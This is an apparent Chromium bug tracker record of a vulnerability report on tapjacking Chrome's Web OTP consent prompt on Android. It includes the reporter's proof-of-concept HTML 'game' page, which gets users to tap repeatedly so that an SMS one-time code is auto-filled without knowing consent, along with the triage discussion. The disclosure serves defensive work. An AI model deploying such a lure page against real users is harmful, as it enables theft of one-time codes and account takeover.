# Android Chrome External Navigation Bubble Tapjacking

| Field | Value |
|-------|-------|
| **Issue ID** | [480730094](https://issues.chromium.org/issues/480730094) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Mobile>Intents |
| **Platforms** | Android |
| **Chrome Version** | 127.0.6533.65 |
| **Reporter** | sh...@gmail.com |
| **Assignee** | la...@chromium.org |
| **Created** | 2026-02-02 |
| **Bounty** | $1,000.00 |

## Description

# Steps to reproduce the problem

1. Create otp receiving page.

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Game</title>
    <style>
        body {
      margin: 0;
      height: 100vh;
      overflow: hidden;
      user-select: none;
    }

    #redBox {
      position: absolute;
      top: 720px;
      right: 50px;
      width: 30px;
      height: 30px;
      background-color: red;
      cursor: pointer;
    }

    #counter, #first {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      font-size: 40px;
    }
  </style>
</head>
<body>
     <div id="game">
    <a id="redBox" href="#" onclick="handleClick()"></a>
    <div id="counter">Click 5x the Red Button to win!</div>
    <p id="res"></p>
  </div>

    <input
  id="otp"
  type="text"
  autocomplete="one-time-code"
  inputmode="numeric"
/>

<script>
document.body.insertAdjacentHTML(
  "beforeend",
  `<h3>Secure context: ${window.isSecureContext}</h3>`
);

if ('OTPCredential' in window) {
  window.addEventListener('DOMContentLoaded', async () => {
    try {
      const ac = new AbortController();

      const otp = await navigator.credentials.get({
        otp: { transport: ['sms'] },
        signal: ac.signal
      });

      document.getElementById('otp').value = otp.code;
      console.log("OTP received:", otp.code);
    } catch (e) {
      console.error("OTP failed:", e);
    }
  });
}

</script>
</body>
</html>

```

2. Host the page in localhost
3. Setup ngrok or https server
4. Visit the page in Chrome of android emulator
5. Setup adb command: adb emu sms send 12345 "Your OTP is 123456 @<YourServer> #123456"
6. Send the adb command then continuously click the red button
7. OTP will be added to the site immediately

## Ref Report:

<https://issues.chromium.org/issues/356658477>

# Problem Description

The chrome is showing if the user wants to send the otp to the site prompt is getting useless because the victim is already allowing it without their knowledge.

- An attacker is able to retrieve SMS OTP codes without explicit user consent.

# Summary

Hello team, I found that Chrome's Web OTP API is vulnerable to bubble tap jacking attack.

# Additional Data

Category: Security   

Chrome Channel: Not sure   

Regression: N/A \

## Attachments

- [chrome-android-otp-tapjacking.mkv](attachments/chrome-android-otp-tapjacking.mkv) (video/x-matroska, 1.5 MB)
- [Tue Apr 14 2026 23:48:42 GMT+0530 (India Standard Time).png](attachments/Tue Apr 14 2026 23_48_42 GMT+0530 (India Standard Time).png) (image/png, 81.1 KB)

## Timeline

### xi...@chromium.org (2026-02-04)

Thanks for the report. Adding the owner of the previous bug to take a look.

### ch...@google.com (2026-02-04)

Setting milestone because of s2 severity.

### ch...@google.com (2026-02-04)

Setting Priority to P1 to match Severity s2. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### su...@gmail.com (2026-02-17)

Hello any updates?

### la...@chromium.org (2026-02-17)

Hi Sudip, thanks for reporting.

Could you share the chrome version by visiting chrome://version?

### su...@gmail.com (2026-02-18)

Hello, I tested the POC with the latest version of Chrome 145.0.7632.75 (Official Build) (64-bit) and the security issue still exists.

### su...@gmail.com (2026-02-23)

Hello, any updates?

### ch...@google.com (2026-03-04)

lazzzis: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.[internal debugging info: security\_nag\_check]

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### ch...@google.com (2026-03-19)

lazzzis: Uh oh! This issue still open and hasn't been updated in the last 29 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.[internal debugging info: security\_nag\_check]

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### la...@google.com (2026-03-25)

Hi Yi, confirming if this is [components/browser\_ui/sms/android/sms\_infobar\_delegate.cc](https://source.chromium.org/chromium/chromium/src/+/main:components/browser_ui/sms/android/sms_infobar_delegate.cc;l=45?q=sms_infobar%20file:.cc%20AND%20-f:%5Eout&ss=chromium)?

IIRC, this can be removed?

### yi...@google.com (2026-03-25)

(I can't open the attached file but based on the recording from <https://issues.chromium.org/issues/356658477> for bubble tap jacking I can imagine what happened in the OTP case)
Typically we should add input protection to avoid such click-jacking issue (similar to the issue above). But because the WebOTP UI on Android is NOT a browser UI, it would be tricky to do so within the Chrome code base. (The UI in components/browser\_ui/sms/android/sms\_infobar\_delegate.cc should only show when the request was initiated from desktop for Chrome sync users so it's less of a problem.)

I'm wondering what protection the OS provides in general for such prompts.

### la...@google.com (2026-04-14)

Hi Reporter, this is an Android UI and not a chrome UI. I don't think we are able to fix that from our side. Could you file this to the Android OS instead?

### su...@gmail.com (2026-04-14)

Hello, I have created a new report from VRP portal and choose Android Scope.

### la...@google.com (2026-04-14)

Hi Reporter, I mean filing against to Android's VRP portal, not Chrome's. Probably this link <https://bughunters.google.com/about/rules/android-friends/android-and-google-devices-security-reward-program-rules> such that the bug is under <https://issuetracker.google.com/components/190923/edit?pli=1>

### su...@gmail.com (2026-04-14)

Hello, you can check the screenshot it's showing Android & Devices VRP.

### la...@google.com (2026-04-14)

Thank you! Sorry for confusion, since I will not got notified about the new report. I believe android side will triage that.

### ch...@google.com (2026-07-22)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/480730094)*
